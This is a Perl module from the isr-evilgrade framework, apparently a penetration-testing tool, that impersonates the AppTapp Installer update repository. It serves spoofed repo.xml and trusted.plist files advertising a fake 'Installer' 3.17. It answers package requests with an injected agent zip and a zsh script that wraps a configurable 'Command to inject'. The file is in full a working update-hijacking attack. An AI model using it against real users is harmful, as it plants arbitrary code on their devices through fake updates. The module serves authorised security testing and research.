###############
# apptapp.pm
#
# Copyright 2010 Francisco Amato
#
# This file is part of isr-evilgrade, www.faradaysec.com .
#
# isr-evilgrade is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation version 2 of the License.
#
# isr-evilgrade is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with isr-evilgrade; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
#
# '''
##
package modules::apptapp;

use strict;
use Data::Dump qw(dump);

use isrcore::utils;

my $base = {
    'name'        => 'apptapp',
    'version'     => '1.0',
    'appver'      => '< 3.11',
    'author'      => ['Francisco Amato < famato +[AT]+ faradaysec.com>'],
    'description' => qq{},
    'vh'          => '(www.apptapp.com|repository.apptapp.com)',
    'request'     => [
        {   'req'    => '/trusted.plist',    #regex friendly
            'type'   => 'file',              #file|string|agent|install
            'method' => '',                  #any
            'bin'    => '',
            'string' => "",
            'parse'  => '1',
            'file' => './include/apptapp/trusted.plist'
        },
        {   'req'    => '/feature',          #regex friendly
            'type'   => 'file',              #file|string|agent|install
            'method' => '',                  #any
            'bin'    => '',
            'string' => "",
            'parse'  => '',
            'file' => './include/apptapp/feature.html'
        },
        {   'req'    => '/1.png',                   #regex friendly
            'type'   => 'file',                     #file|string|agent|install
            'method' => '',                         #any
            'bin'    => '1',
            'string' => "",
            'parse'  => '',
            'file'   => './include/apptapp/1.png'
        },
        {   'req'    => '/new.png',                 #regex friendly
            'type'   => 'file',                     #file|string|agent|install
            'method' => '',                         #any
            'bin'    => '1',
            'string' => "",
            'parse'  => '',
            'file'   => './include/apptapp/new.png'
        },
        {   'req'    => '/apptapp.png',             #regex friendly
            'type'   => 'file',                     #file|string|agent|install
            'method' => '',                         #any
            'bin'    => '1',
            'string' => "",
            'parse'  => '',
            'file' => './include/apptapp/apptapp.png'
        },
        {   'req'    => '/script',                  #regex friendly
            'type'   => 'string',                   #file|string|agent|install
            'method' => '',                         #any
            'bin'    => '0',
            'string' => "#!/bin/zsh\n" . "<%CMD%>",
            'parse'  => '1',
            'file'   => ''
        },

        {   'req'    => '(/repo.xml|/$)',           #regex friendly
            'type'   => 'file',                     #file|string|agent|install
            'method' => '',                         #any
            'bin'    => '',
            'string' => "",
            'parse'  => '1',
            'file'   => './include/apptapp/repo.xml'
        },

        {   'req'    => '.zip',                     #regex friendly
            'type'   => 'agent',                    #file|string|agent|install
            'method' => '',                         #any
            'bin'    => 1,
            'string' => '',
            'parse'  => '0',
            'file'   => ''
        },
    ],

    #Options
    'options' => {
        'agent' =>
            { 'val' => './agent/apptapp.zip', 'desc' => 'Agent to inject' },
        'enable' => {
            'val'  => 1,
            'desc' => 'Status'
        },
        'ver' => {
            'val'  => "3.17",
            'desc' => 'Application version'
        },
        'bundleIdentifier' => {
            'val'  => "com.apptapp.Installer",
            'desc' => 'Application to install'
        },
        'contact' => {
            'val'  => "famato\@faradaysec.com",
            'desc' => 'Email contact'
        },
        'description' => {
            'val'  => "The new AppTapp Installer.",
            'desc' => 'Application description'
        },
        'maintainer' => {
            'val'  => "Nullriver Software.",
            'desc' => 'Maintainer name'
        },
        'name' => {
            'val'  => "Installer",
            'desc' => 'Installer name'
        },
        'url' => {
            'val'  => "http://www.nullriver.com/",
            'desc' => 'Url'
        },
        'category' => {
            'val'  => "System",
            'desc' => 'Category name'
        },
        'cmd' => {
            'val'  => "/bin/date > /tmp/info\n",
            'desc' => 'Command to inject'
        },

    }
};

##########################################################################
# FUNCTION      new
# RECEIVES
# RETURNS
# EXPECTS
# DOES          class's constructor
sub new {
    my $class = shift;
    my $self = { 'Base' => $base, @_ };
    return bless $self, $class;
}
1;
